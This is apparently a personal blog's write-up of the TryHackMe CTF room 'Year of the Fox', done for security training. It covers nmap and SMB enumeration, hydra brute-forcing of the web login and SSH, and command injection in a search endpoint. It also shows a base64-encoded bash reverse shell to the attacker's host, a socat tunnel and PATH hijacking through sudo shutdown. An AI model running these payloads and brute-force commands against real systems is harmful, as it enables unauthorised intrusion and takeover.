@@ -1,0 +1,171 @@
+<!DOCTYPE html><html lang=en><head><meta charset=utf-8><meta name=author content="Ankur Tyagi (@7h3rAm)"><meta name=description content="Personal Weblog"><meta content="width=device-width, initial-scale=1" name=viewport><title>मंथन | Manthan</title><link rel=icon type=image/webp sizes=32x32 href=/static/images/manthan-32x32.png.webp><link rel=stylesheet type=text/css media=screen href=/static/css/style.rainbow.css><link rel=stylesheet href=/static/css/atelier-forest-light.css><script charset=UTF-8 src=/static/js/highlight.min.js></script><script charset=UTF-8 src=/static/js/highlightjs-line-numbers.min.js></script><script charset=UTF-8 src=/static/js/go.min.js></script></head><body><div class=header><table><tr><td><a href=/index.html class=menu_home>मंथन</a></td><td> | </td><td><a href=/archive.html class=menu_archive>Archive</a></td><td> | </td><td><a href=/tags.html class=menu_tags>Tags</a></td><td> | </td><td><a href=/stats.html class=menu_stats>Stats</a></td></tr></table></div><div class=body><h1 class="h1 collapsible" onclick=toggle(this);>[THM] Year of the Fox</h1><p><a href=/posts/20200625_htb-bashed.html> « </a>📅 published on <code>30/Jul/2020</code><a href=/posts/20200810_vulnhub-infosecpreposcp.html> » </a></p><h2 class="h2 collapsible" onclick=toggle(this);>Overview</h2><p class=nested>This is a writeup for TryHackMe VM <a href=https://tryhackme.com/room/yotf>Year of the Fox</a>. Here's an overview of the <code>enumeration</code> → <code>exploitation</code> → <code>privilege escalation</code> process:</p><h3 class="h3 collapsible" onclick=toggle(this);>Killchain</h3><p class=nested><img alt=writeup.overview.killchain src=/static/files/posts_thm_yotf/killchain.png.webp></p><h3 class="h3 collapsible" onclick=toggle(this);>TTPs</h3><p class=nested>1. <code>80/tcp/http/Apache httpd 2.4.29</code>: <a href=https://github.com/7h3rAm/writeups#enumerate_proto_http>enumerate_proto_http</a>, <a href=https://github.com/7h3rAm/writeups#exploit_command_injection>exploit_command_injection</a>, <a href=https://github.com/7h3rAm/writeups#privesc_env_relative_path>privesc_env_relative_path</a> </p><h2 class="h2 collapsible" onclick=toggle(this);>Phase #1: Enumeration</h2><p class=nested>1. Here's the Nmap scan result: </p><pre class=nested><code># Nmap 7.80 scan initiated Wed Jul 29 19:54:07 2020 as: nmap -vv --reason -Pn -sV -sC --version-all -oN /home/kali/toolbox/repos/writeupsall/thm.yotf/10.10.41.240/scans/_quick_tcp_nmap.txt -oX /home/kali/toolbox/repos/writeupsall/thm.yotf/10.10.41.240/scans/xml/_quick_tcp_nmap.xml 10.10.41.240
+Increasing send delay for 10.10.41.240 from 0 to 5 due to 25 out of 82 dropped probes since last increase.
+Nmap scan report for 10.10.41.240
+Host is up, received user-set (0.21s latency).
+Scanned at 2020-07-29 19:54:22 IST for 42s
+Not shown: 997 closed ports
+Reason: 997 conn-refused
+PORT    STATE SERVICE     REASON  VERSION
+80/tcp  open  http        syn-ack Apache httpd 2.4.29
+| http-auth: 
+| HTTP/1.1 401 Unauthorized\x0D
+|_  Basic realm=You want in? Gotta guess the password!
+|_http-server-header: Apache/2.4.29 (Ubuntu)
+|_http-title: 401 Unauthorized
+139/tcp open  netbios-ssn syn-ack Samba smbd 3.X - 4.X (workgroup: YEAROFTHEFOX)
+445/tcp open  netbios-ssn syn-ack Samba smbd 4.7.6-Ubuntu (workgroup: YEAROFTHEFOX)
+Service Info: Hosts: year-of-the-fox.lan, YEAR-OF-THE-FOX
+
+Host script results:
+|_clock-skew: mean: -20m00s, deviation: 34m37s, median: -1s
+| nbstat: NetBIOS name: YEAR-OF-THE-FOX, NetBIOS user: &lt;unknown&gt;, NetBIOS MAC: &lt;unknown&gt; (unknown)
+| Names:
+|   YEAR-OF-THE-FOX&lt;00&gt;  Flags: &lt;unique&gt;&lt;active&gt;
+|   YEAR-OF-THE-FOX&lt;03&gt;  Flags: &lt;unique&gt;&lt;active&gt;
+|   YEAR-OF-THE-FOX&lt;20&gt;  Flags: &lt;unique&gt;&lt;active&gt;
+|   \x01\x02__MSBROWSE__\x02&lt;01&gt;  Flags: &lt;group&gt;&lt;active&gt;
+|   YEAROFTHEFOX&lt;00&gt;     Flags: &lt;group&gt;&lt;active&gt;
+|   YEAROFTHEFOX&lt;1d&gt;     Flags: &lt;unique&gt;&lt;active&gt;
+|   YEAROFTHEFOX&lt;1e&gt;     Flags: &lt;group&gt;&lt;active&gt;
+| Statistics:
+|   00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
+|   00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
+|_  00 00 00 00 00 00 00 00 00 00 00 00 00 00
+| p2p-conficker: 
+|   Checking for Conficker.C or higher...
+|   Check 1 (port 57972/tcp): CLEAN (Couldn't connect)
+|   Check 2 (port 24267/tcp): CLEAN (Couldn't connect)
+|   Check 3 (port 63864/udp): CLEAN (Failed to receive data)
+|   Check 4 (port 42720/udp): CLEAN (Failed to receive data)
+|_  0/4 checks are positive: Host is CLEAN or ports are blocked
+| smb-os-discovery: 
+|   OS: Windows 6.1 (Samba 4.7.6-Ubuntu)
+|   Computer name: year-of-the-fox
+|   NetBIOS computer name: YEAR-OF-THE-FOX\x00
+|   Domain name: lan
+|   FQDN: year-of-the-fox.lan
+|_  System time: 2020-07-29T15:24:57+01:00
+| smb-security-mode: 
+|   account_used: guest
+|   authentication_level: user
+|   challenge_response: supported
+|_  message_signing: disabled (dangerous, but default)
+| smb2-security-mode: 
+|   2.02: 
+|_    Message signing enabled but not required
+| smb2-time: 
+|   date: 2020-07-29T14:24:57
+|_  start_date: N/A
+
+Read data files from: /usr/bin/../share/nmap
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+# Nmap done at Wed Jul 29 19:55:04 2020 -- 1 IP address (1 host up) scanned in 56.96 seconds
+</code></pre><p class=nested>2. We find <code>80/tcp</code> to be open and enumerate it further. The webapp enforces authentication due to which we are not allowed to view any pages. We will need to find the credentials for the web app to proceed with this further: </p><p class=nested>3. From the scan results SMB for ports, we find that there are two active users on this machine: <code>fox</code> and <code>rascal</code> </p><pre class=nested><code>[+] Enumerating users using SID S-1-22-1 and logon username '', password ''
+S-1-22-1-1000 Unix User\fox (Local User)
+  User Name   : fox
+  Full Name   : fox
+  Home Drive  : \\year-of-the-fox\fox
+  Dir Drive   : 
+  Profile Path: \\year-of-the-fox\fox\profile
+  Logon Script: 
+
+S-1-22-1-1001 Unix User\rascal (Local User)
+Use of uninitialized value $user_info in pattern match (m//) at ./enum4linux.pl line 932.
+
+ ============================================= 
+|    Getting printer info for 10.10.41.240    |
+ ============================================= 
+No printers returned.
+
+enum4linux complete on Wed Jul 29 20:18:34 2020
+</code></pre><p class=nested>4. We run a password bruteforce scan against the webapp for both usernames and find a hit: </p><pre class=nested><code>hydra -l rascal -P /usr/share/wordlists/rockyou.txt 10.10.41.240 http-head /
+</code></pre><p class=nested><img alt=writeup.enumeration.steps.4.1 src=/static/files/posts_thm_yotf/screenshot01.png.webp> </p><p class=nested>5. Upon logging in, we see a webpage with a search text box try out a few queries. Submitting an empty string shows a listing of 3 files. We setup Burp proxy and start enumerating the search functionality further: </p><p class=nested><img alt=writeup.enumeration.steps.5.1 src=/static/files/posts_thm_yotf/screenshot02.png.webp> </p><p class=nested><img alt=writeup.enumeration.steps.5.2 src=/static/files/posts_thm_yotf/screenshot03.png.webp> </p><p class=nested><img alt=writeup.enumeration.steps.5.3 src=/static/files/posts_thm_yotf/screenshot04.png.webp> </p><p class=nested><img alt=writeup.enumeration.steps.5.4 src=/static/files/posts_thm_yotf/screenshot05.png.webp> </p><p class=nested>6. We find a way to escape the search input and get command execution on the target machine: </p><pre class=nested><code>POST /assets/php/search.php HTTP/1.1
+  Host: 10.10.41.240
+  User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
+  Accept: */*
+  Accept-Language: en-US,en;q=0.5
+  Accept-Encoding: gzip, deflate
+  Referer: http://10.10.41.240/
+  Content-Type: text/plain;charset=UTF-8
+  Content-Length: 101
+  Authorization: Basic cmFzY2FsOmxvdmU=
+  Connection: close
+
+  {&quot;target&quot;:&quot;\&quot;;whoami\n&quot;}
+</code></pre><p class=nested><img alt=writeup.enumeration.steps.6.1 src=/static/files/posts_thm_yotf/screenshot06.png.webp> </p><p class=nested>7. We use this to triage the file system and find the first web flag file: </p><pre class=nested><code>POST /assets/php/search.php HTTP/1.1
+  Host: 10.10.41.240
+  User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
+  Accept: */*
+  Accept-Language: en-US,en;q=0.5
+  Accept-Encoding: gzip, deflate
+  Referer: http://10.10.41.240/
+  Content-Type: text/plain;charset=UTF-8
+  Content-Length: 101
+  Authorization: Basic cmFzY2FsOmxvdmU=
+  Connection: close
+
+  {&quot;target&quot;:&quot;\&quot;cat ../../../web-flag.txt;\n&quot;}
+</code></pre><p class=nested><img alt=writeup.enumeration.steps.7.1 src=/static/files/posts_thm_yotf/screenshot07.png.webp> </p><h3 class="h3 collapsible" onclick=toggle(this);>Findings</h3><h4 class="h4 collapsible" onclick=toggle(this);>Open Ports</h4><pre class=nested><code>80/tcp    http          Apache httpd 2.4.29
+139/tcp   netbios-ssn   Samba smbd 3.X - 4.X (workgroup: YEAROFTHEFOX)
+445/tcp   netbios-ssn   Samba smbd 4.7.6-Ubuntu (workgroup: YEAROFTHEFOX)
+</code></pre><h4 class="h4 collapsible" onclick=toggle(this);>Users</h4><pre class=nested><code>ssh: rascal, fox
+webapp: rascal
+</code></pre><h2 class="h2 collapsible" onclick=toggle(this);>Phase #2: Exploitation</h2><p class=nested>1. We further leverage the command execution vulnerability to get interactive access on the target machine. For this, we first start a local netcat listener and use a bash reverse shell: </p><pre class=nested><code>nc -nlvp 4433
+
+POST /assets/php/search.php HTTP/1.1
+  Host: 10.10.41.240
+  User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
+  Accept: */*
+  Accept-Language: en-US,en;q=0.5
+  Accept-Encoding: gzip, deflate
+  Referer: http://10.10.41.240/
+  Content-Type: text/plain;charset=UTF-8
+  Content-Length: 101
+  Authorization: Basic cmFzY2FsOmxvdmU=
+  Connection: close
+
+  {&quot;target&quot;:&quot;\&quot;;echo 'YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC44LjI2LjE4OS80NDMzIDA+JjE=' | base64 -d | bash \n&quot;}
+</code></pre><p class=nested><img alt=writeup.exploitation.steps.1.1 src=/static/files/posts_thm_yotf/screenshot08.png.webp> </p><p class=nested><img alt=writeup.exploitation.steps.1.2 src=/static/files/posts_thm_yotf/screenshot08a.png.webp> </p><p class=nested>2. We get a shell with <code>www-data</code> privileges and use it to probe further. From the listing of open ports, we find that the ssh port <code>22/tcp</code> is open and accepting connection only on the localhost interface. We can use <code>socat</code> to tunnel this port to probe it from our attacking system: </p><pre class=nested><code>socat tcp-listen:1337,reuseaddr,fork tcp:localhost:22
+</code></pre><p class=nested><img alt=writeup.exploitation.steps.2.1 src=/static/files/posts_thm_yotf/screenshot09.png.webp> </p><p class=nested>3. With this, we now have tunneled <code>localhost:22</code> to <code>10.10.41.240:1337</code> and can now run a ssh password bruteforce for user <code>fox</code> on it. After a few minutes we find a hit and can now login: </p><pre class=nested><code>hydra -l fox -P /usr/share/wordlists/rockyou.txt ssh://10.10.41.240:1337
+ssh fox@10.10.41.240 -p1337
+</code></pre><p class=nested><img alt=writeup.exploitation.steps.3.1 src=/static/files/posts_thm_yotf/screenshot10.png.webp> </p><p class=nested><img alt=writeup.exploitation.steps.3.2 src=/static/files/posts_thm_yotf/screenshot11.png.webp> </p><p class=nested>4. We find the second flag file <code>/home/fox/user-flag.txt</code>: </p><p class=nested><img alt=writeup.exploitation.steps.4.1 src=/static/files/posts_thm_yotf/screenshot12.png.webp> </p><h2 class="h2 collapsible" onclick=toggle(this);>Phase #2.5: Post Exploitation</h2><pre class=nested><code>www-data@year-of-the-fox&gt; id
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+www-data@year-of-the-fox&gt;  
+www-data@year-of-the-fox&gt; uname
+Linux year-of-the-fox 4.15.0-101-generic #102-Ubuntu SMP Mon May 11 10:07:26 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux
+www-data@year-of-the-fox&gt;  
+www-data@year-of-the-fox&gt; ifconfig
+eth0: flags=4163&lt;UP,BROADCAST,RUNNING,MULTICAST&gt;  mtu 9001
+  inet 10.10.41.240  netmask 255.255.0.0  broadcast 10.10.255.255
+  inet6 fe80::12:4bff:fe54:f2e0  prefixlen 64  scopeid 0x20&lt;link&gt;
+  ether 02:12:4b:54:f2:e0  txqueuelen 1000  (Ethernet)
+  RX packets 76192  bytes 8543685 (8.5 MB)
+  RX errors 0  dropped 0  overruns 0  frame 0
+  TX packets 72416  bytes 14679085 (14.6 MB)
+  TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
+
+lo: flags=73&lt;UP,LOOPBACK,RUNNING&gt;  mtu 65536
+  inet 127.0.0.1  netmask 255.0.0.0
+  inet6 ::1  prefixlen 128  scopeid 0x10&lt;host&gt;
+  loop  txqueuelen 1000  (Local Loopback)
+  RX packets 6896  bytes 489426 (489.4 KB)
+  RX errors 0  dropped 0  overruns 0  frame 0
+  TX packets 6896  bytes 489426 (489.4 KB)
+  TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
+www-data@year-of-the-fox&gt;  
+www-data@year-of-the-fox&gt; users
+rascal
+fox
+root
+</code></pre><h2 class="h2 collapsible" onclick=toggle(this);>Phase #3: Privilege Escalation</h2><p class=nested>1. We find that we can execute the <code>/usr/sbin/shutdown</code> file with <code>sudo</code>. Since the target machine doesn't have <code>strings</code> installed, we transfer this file to our attacking machine and investigate further. We find a reference to the <code>poweroff</code> binary name, which when combined with the fact that <code>secure_path</code> is not defined wihtin <code>/etc/sudoers</code> (seen in <code>sudo -l</code> output), hint that a environment path modification vector could help us escalate privileges: </p><p class=nested><img alt=writeup.privesc.steps.1.1 src=/static/files/posts_thm_yotf/screenshot13.png.webp> </p><p class=nested>2. We copy bash to the local directory, rename it to <code>poweroff</code> and modify the <code>PATH</code> environment variable to search for file within current directory first. With this change, we then execute <code>shutdown</code> file and get elevated privileges: </p><pre class=nested><code>cp /bin/bash ./
+mv ./bash poweroff
+ls -la poweroff /bin/bash
+md5sum poweroff /bin/bash
+sudo /usr/sbin/shutdown
+</code></pre><p class=nested><img alt=writeup.privesc.steps.2.1 src=/static/files/posts_thm_yotf/screenshot14.png.webp> </p><p class=nested><img alt=writeup.privesc.steps.2.2 src=/static/files/posts_thm_yotf/screenshot15.png.webp> </p><p class=nested>3. We see the third flag file <code>root.txt</code> but it turns out to be placeholder. After some searching, we find the actual root flag file <code>.did-you-think-I-was-useless.root</code>, hidden within user <code>rascal</code>'s home directory: </p><pre class=nested><code>cat /home/rascal/.did-you-think-I-was-useless.root
+</code></pre><p class=nested><img alt=writeup.privesc.steps.3.1 src=/static/files/posts_thm_yotf/screenshot16.png.webp> </p><p class=nested><img alt=writeup.privesc.steps.3.2 src=/static/files/posts_thm_yotf/screenshot17.png.webp> </p><h2 class="h2 collapsible" onclick=toggle(this);>Learning/Recommendation</h2><ul class=nested><li>The webapp exposed a search field which was vulnerable to command injection. This allowed the attacker to gain interactive access of the target machine. It is advised to follow a secure development lifecycle for critical production web applications.</li><li>The <code>shutdown</code> binary was vulnerable to a path expansion attack which allowed the atatcker to gain elevated privileges.</li></ul><h2 class="h2 collapsible" onclick=toggle(this);>Loot</h2><h3 class="h3 collapsible" onclick=toggle(this);>Credentials</h3><pre class=nested><code>ssh: fox/1234...
+webapp: rascal/l...
+</code></pre><h3 class="h3 collapsible" onclick=toggle(this);>Flags</h3><pre class=nested><code>/var/www/web-flag.txt: THM{Nzg2ZWQwYWUwN2UwOTU3N............
+/home/fox/user-flag.txt: THM{Njg3NWZhNDBjMmNlMzNkM............
+/home/rascal/.did-you-think-I-was-useless.root: THM{ODM3NTdkMDljYmM4.................
+</code></pre><h2 class="h2 collapsible" onclick=toggle(this);>References</h2><ul class=nested><li><a href=https://tryhackme.com/room/yotf>https://tryhackme.com/room/yotf</a> </li><li><a href=https://muirlandoracle.co.uk/2020/05/30/year-of-the-fox-write-up/ >https://muirlandoracle.co.uk/2020/05/30/year-of-the-fox-write-up/</a> </li><li><a href=https://www.cybergoat.co.uk/writeup/Year-of-Fox-TryHackMe/ >https://www.cybergoat.co.uk/writeup/Year-of-Fox-TryHackMe/</a> </li><li><a href=https://blog.tryhackme.com/year-of-the-fox-official-write-up/ >https://blog.tryhackme.com/year-of-the-fox-official-write-up/</a> </li></ul><p style=text-align:center;>(🔖 tagged <a href=/tags.html#tryhackme>tryhackme</a> and <a href=/tags.html#writeup>writeup</a>)</p><p style=text-align:center;>« <a href=/posts/20200625_htb-bashed.html>[HackTheBox] Bashed...</a> « | » <a href=/posts/20200810_vulnhub-infosecpreposcp.html>[VulnHub] InfoSec Prep: OSCP...</a> »</p></div><script>hljs.initHighlightingOnLoad();</script><script>hljs.initLineNumbersOnLoad();</script><script>function toggle(s){s.classList.toggle("expanded");var t=!1,i=!1,a=!1;s.classList.contains("h2")&&(t=!0),s.classList.contains("h3")&&(i=!0),s.classList.contains("h4")&&(a=!0),console.log(s),console.log(t),console.log(i),console.log(a);for(var l=s.nextElementSibling;l;){if(t&&l.classList.contains("h2")){l.classList.toggle("active");break}if(i&&(l.classList.contains("h2")||l.classList.contains("h3"))){l.classList.toggle("active");break}if(a&&(l.classList.contains("h2")||l.classList.contains("h3")||l.classList.contains("h4"))){l.classList.toggle("active");break}l.classList.contains("collapsible")&&l.classList.toggle("expanded"),l.classList.toggle("active"),l=l.nextElementSibling}}</script><script data-goatcounter=https://manthan.goatcounter.com/count async src=//gc.zgo.at/count.js></script><div class="footer footercenter"><span><a href=https://creativecommons.org/licenses/by-sa/4.0/ class=footspan>  </a></span></div></body></html>
